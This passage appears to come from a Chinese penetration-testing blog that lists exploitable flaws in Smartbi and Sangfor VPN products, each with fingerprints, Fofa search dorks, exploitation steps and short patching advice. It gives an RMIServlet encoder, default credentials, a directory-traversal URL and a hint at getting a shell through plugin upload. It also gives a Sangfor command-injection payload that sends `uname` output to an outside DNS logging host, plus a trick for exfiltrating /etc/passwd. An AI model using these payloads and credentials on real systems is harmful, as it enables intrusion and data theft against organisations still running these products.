&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        } finally {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            DbUtil.closeDBObject((ResultSet)rs, prep, conn);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return succ ? 1 : 0;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    } else {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return 1;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.RMIServlet加解密代码&lt;/p&gt;
&lt;p&gt;虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ENCODING_SCHEDULE = {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;0&amp;#34;: &amp;#34;7&amp;#34;, &amp;#34;1&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;2&amp;#34;: &amp;#34;u&amp;#34;, &amp;#34;3&amp;#34;: &amp;#34;N&amp;#34;, &amp;#34;4&amp;#34;: &amp;#34;K&amp;#34;, &amp;#34;5&amp;#34;: &amp;#34;J&amp;#34;, &amp;#34;6&amp;#34;: &amp;#34;M&amp;#34;, &amp;#34;7&amp;#34;: &amp;#34;9&amp;#34;, &amp;#34;8&amp;#34;: &amp;#34;&amp;#39;&amp;#34;, &amp;#34;9&amp;#34;: &amp;#34;m&amp;#34;, &amp;#34;!&amp;#34;: &amp;#34;P&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;%&amp;#34;: &amp;#34;/&amp;#34;, &amp;#34;&amp;#39;&amp;#34;: &amp;#34;n&amp;#34;, &amp;#34;(&amp;#34;: &amp;#34;A&amp;#34;, &amp;#34;)&amp;#34;: &amp;#34;E&amp;#34;, &amp;#34;*&amp;#34;: &amp;#34;s&amp;#34;, &amp;#34;+&amp;#34;: &amp;#34;+&amp;#34;, &amp;#34;-&amp;#34;: &amp;#34;f&amp;#34;, &amp;#34;.&amp;#34;: &amp;#34;q&amp;#34;, &amp;#34;A&amp;#34;: &amp;#34;O&amp;#34;, &amp;#34;B&amp;#34;: &amp;#34;V&amp;#34;, &amp;#34;C&amp;#34;: &amp;#34;t&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;D&amp;#34;: &amp;#34;T&amp;#34;, &amp;#34;E&amp;#34;: &amp;#34;a&amp;#34;, &amp;#34;F&amp;#34;: &amp;#34;x&amp;#34;, &amp;#34;G&amp;#34;: &amp;#34;H&amp;#34;, &amp;#34;H&amp;#34;: &amp;#34;r&amp;#34;, &amp;#34;I&amp;#34;: &amp;#34;c&amp;#34;, &amp;#34;J&amp;#34;: &amp;#34;v&amp;#34;, &amp;#34;K&amp;#34;: &amp;#34;l&amp;#34;, &amp;#34;L&amp;#34;: &amp;#34;8&amp;#34;, &amp;#34;M&amp;#34;: &amp;#34;F&amp;#34;, &amp;#34;N&amp;#34;: &amp;#34;3&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;O&amp;#34;: &amp;#34;o&amp;#34;, &amp;#34;P&amp;#34;: &amp;#34;L&amp;#34;, &amp;#34;Q&amp;#34;: &amp;#34;Y&amp;#34;, &amp;#34;R&amp;#34;: &amp;#34;j&amp;#34;, &amp;#34;S&amp;#34;: &amp;#34;W&amp;#34;, &amp;#34;T&amp;#34;: &amp;#34;*&amp;#34;, &amp;#34;U&amp;#34;: &amp;#34;z&amp;#34;, &amp;#34;V&amp;#34;: &amp;#34;Z&amp;#34;, &amp;#34;W&amp;#34;: &amp;#34;!&amp;#34;, &amp;#34;X&amp;#34;: &amp;#34;B&amp;#34;, &amp;#34;Y&amp;#34;: &amp;#34;)&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;Z&amp;#34;: &amp;#34;U&amp;#34;, &amp;#34;a&amp;#34;: &amp;#34;(&amp;#34;, &amp;#34;b&amp;#34;: &amp;#34;~&amp;#34;, &amp;#34;c&amp;#34;: &amp;#34;i&amp;#34;, &amp;#34;d&amp;#34;: &amp;#34;h&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;p&amp;#34;, &amp;#34;f&amp;#34;: &amp;#34;_&amp;#34;, &amp;#34;g&amp;#34;: &amp;#34;-&amp;#34;, &amp;#34;h&amp;#34;: &amp;#34;I&amp;#34;, &amp;#34;i&amp;#34;: &amp;#34;R&amp;#34;, &amp;#34;j&amp;#34;: &amp;#34;.&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;k&amp;#34;: &amp;#34;G&amp;#34;, &amp;#34;l&amp;#34;: &amp;#34;S&amp;#34;, &amp;#34;m&amp;#34;: &amp;#34;d&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;6&amp;#34;, &amp;#34;o&amp;#34;: &amp;#34;w&amp;#34;, &amp;#34;p&amp;#34;: &amp;#34;5&amp;#34;, &amp;#34;q&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;r&amp;#34;: &amp;#34;4&amp;#34;, &amp;#34;s&amp;#34;: &amp;#34;D&amp;#34;, &amp;#34;t&amp;#34;: &amp;#34;k&amp;#34;, &amp;#34;u&amp;#34;: &amp;#34;Q&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;v&amp;#34;: &amp;#34;g&amp;#34;, &amp;#34;w&amp;#34;: &amp;#34;b&amp;#34;, &amp;#34;x&amp;#34;: &amp;#34;C&amp;#34;, &amp;#34;y&amp;#34;: &amp;#34;2&amp;#34;, &amp;#34;z&amp;#34;: &amp;#34;X&amp;#34;, &amp;#34;~&amp;#34;: &amp;#34;e&amp;#34;, &amp;#34;_&amp;#34;: &amp;#34;y&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DECODING_SCHEDULE = {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;7&amp;#34;: &amp;#34;0&amp;#34;, &amp;#34;1&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;u&amp;#34;: &amp;#34;2&amp;#34;, &amp;#34;N&amp;#34;: &amp;#34;3&amp;#34;, &amp;#34;K&amp;#34;: &amp;#34;4&amp;#34;, &amp;#34;J&amp;#34;: &amp;#34;5&amp;#34;, &amp;#34;M&amp;#34;: &amp;#34;6&amp;#34;, &amp;#34;9&amp;#34;: &amp;#34;7&amp;#34;, &amp;#34;&amp;#39;&amp;#34;: &amp;#34;8&amp;#34;, &amp;#34;m&amp;#34;: &amp;#34;9&amp;#34;, &amp;#34;P&amp;#34;: &amp;#34;!&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;/&amp;#34;: &amp;#34;%&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;#39;&amp;#34;, &amp;#34;A&amp;#34;: &amp;#34;(&amp;#34;, &amp;#34;E&amp;#34;: &amp;#34;)&amp;#34;, &amp;#34;s&amp;#34;: &amp;#34;*&amp;#34;, &amp;#34;+&amp;#34;: &amp;#34;+&amp;#34;, &amp;#34;f&amp;#34;: &amp;#34;-&amp;#34;, &amp;#34;q&amp;#34;: &amp;#34;.&amp;#34;, &amp;#34;O&amp;#34;: &amp;#34;A&amp;#34;, &amp;#34;V&amp;#34;: &amp;#34;B&amp;#34;, &amp;#34;t&amp;#34;: &amp;#34;C&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;T&amp;#34;: &amp;#34;D&amp;#34;, &amp;#34;a&amp;#34;: &amp;#34;E&amp;#34;, &amp;#34;x&amp;#34;: &amp;#34;F&amp;#34;, &amp;#34;H&amp;#34;: &amp;#34;G&amp;#34;, &amp;#34;r&amp;#34;: &amp;#34;H&amp;#34;, &amp;#34;c&amp;#34;: &amp;#34;I&amp;#34;, &amp;#34;v&amp;#34;: &amp;#34;J&amp;#34;, &amp;#34;l&amp;#34;: &amp;#34;K&amp;#34;, &amp;#34;8&amp;#34;: &amp;#34;L&amp;#34;, &amp;#34;F&amp;#34;: &amp;#34;M&amp;#34;, &amp;#34;3&amp;#34;: &amp;#34;N&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;o&amp;#34;: &amp;#34;O&amp;#34;, &amp;#34;L&amp;#34;: &amp;#34;P&amp;#34;, &amp;#34;Y&amp;#34;: &amp;#34;Q&amp;#34;, &amp;#34;j&amp;#34;: &amp;#34;R&amp;#34;, &amp;#34;W&amp;#34;: &amp;#34;S&amp;#34;, &amp;#34;*&amp;#34;: &amp;#34;T&amp;#34;, &amp;#34;z&amp;#34;: &amp;#34;U&amp;#34;, &amp;#34;Z&amp;#34;: &amp;#34;V&amp;#34;, &amp;#34;!&amp;#34;: &amp;#34;W&amp;#34;, &amp;#34;B&amp;#34;: &amp;#34;X&amp;#34;, &amp;#34;)&amp;#34;: &amp;#34;Y&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;U&amp;#34;: &amp;#34;Z&amp;#34;, &amp;#34;(&amp;#34;: &amp;#34;a&amp;#34;, &amp;#34;~&amp;#34;: &amp;#34;b&amp;#34;, &amp;#34;i&amp;#34;: &amp;#34;c&amp;#34;, &amp;#34;h&amp;#34;: &amp;#34;d&amp;#34;, &amp;#34;p&amp;#34;: &amp;#34;e&amp;#34;, &amp;#34;_&amp;#34;: &amp;#34;f&amp;#34;, &amp;#34;-&amp;#34;: &amp;#34;g&amp;#34;, &amp;#34;I&amp;#34;: &amp;#34;h&amp;#34;, &amp;#34;R&amp;#34;: &amp;#34;i&amp;#34;, &amp;#34;.&amp;#34;: &amp;#34;j&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;G&amp;#34;: &amp;#34;k&amp;#34;, &amp;#34;S&amp;#34;: &amp;#34;l&amp;#34;, &amp;#34;d&amp;#34;: &amp;#34;m&amp;#34;, &amp;#34;6&amp;#34;: &amp;#34;n&amp;#34;, &amp;#34;w&amp;#34;: &amp;#34;o&amp;#34;, &amp;#34;5&amp;#34;: &amp;#34;p&amp;#34;, &amp;#34;0&amp;#34;: &amp;#34;q&amp;#34;, &amp;#34;4&amp;#34;: &amp;#34;r&amp;#34;, &amp;#34;D&amp;#34;: &amp;#34;s&amp;#34;, &amp;#34;k&amp;#34;: &amp;#34;t&amp;#34;, &amp;#34;Q&amp;#34;: &amp;#34;u&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#34;g&amp;#34;: &amp;#34;v&amp;#34;, &amp;#34;b&amp;#34;: &amp;#34;w&amp;#34;, &amp;#34;C&amp;#34;: &amp;#34;x&amp;#34;, &amp;#34;2&amp;#34;: &amp;#34;y&amp;#34;, &amp;#34;X&amp;#34;: &amp;#34;z&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;~&amp;#34;, &amp;#34;y&amp;#34;: &amp;#34;_&amp;#34;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#此函数可以用来加密明文也可以解密服务器返回的密文
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def encode(code):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    out = &amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    for item in code:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        out = out + ENCODING_SCHEDULE.get(item, item)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    return out
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def decode(code):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    out = &amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    for item in code:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        out = out + DECODING_SCHEDULE.get(item, item)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    return out
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;2.该系统还有几处漏洞, 比如默认口令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;demo/demo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;manager/demo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin/admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin/manager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin/2manager
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;3.默认路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:18080/smartbi/vision/config.jsp&lt;/code&gt; 可能未修改密码或者密码为&lt;code&gt;manager&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4.进入后台目录遍历&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;amp;root=C%3A%2F&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样是后台可以加载插件, 怎么getshell不用我多说了吧&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.使用强口令&lt;/p&gt;
&lt;p&gt;3.版本最好为最新版8.5以上, v7还有其他漏洞&lt;/p&gt;
&lt;h2 id=&#34;第二节&#34;&gt;第二节&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;本节主要是针对网络边界产品, VPN, 防火墙, 邮箱一类的相关漏洞, 属于典型灯下黑的情况, 厂商可能会忘记, 但是攻击者不会放过一丝一毫&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;深信服vpn远程代码执行&#34;&gt;深信服VPN远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
深信服 VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: TWFID=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;welcome to ssl vpn&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Sinfor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;header=&amp;quot;Set-Cookie: TWFID=&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;深信服vpnweb登录逆向学习 – potatso – 博客园
&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/potatsoSec/p/12326356.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/potatsoSec/p/12326356.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wget -t %d -T %d --spider %s&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;por&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;checkurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;csp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;retry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ceye&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网&lt;/p&gt;
&lt;p&gt;2.该版本较低, &lt;code&gt;whomai&lt;/code&gt;不存在, 可以使用 &lt;code&gt;uname&lt;/code&gt;, 这里没有空格可dns传出来&lt;/p&gt;
&lt;p&gt;3.去除空格也简单 &lt;code&gt;cat /etc/passwd | tr &amp;quot; \n&amp;quot; &amp;quot;+|&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;深信服-vpn-口令爆破&#34;&gt;深信服 VPN 口令爆破&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
深信服 VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/por/login_auth.csp?apiversion=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sangfor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/cgi-bin/login.cgi?rnd=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
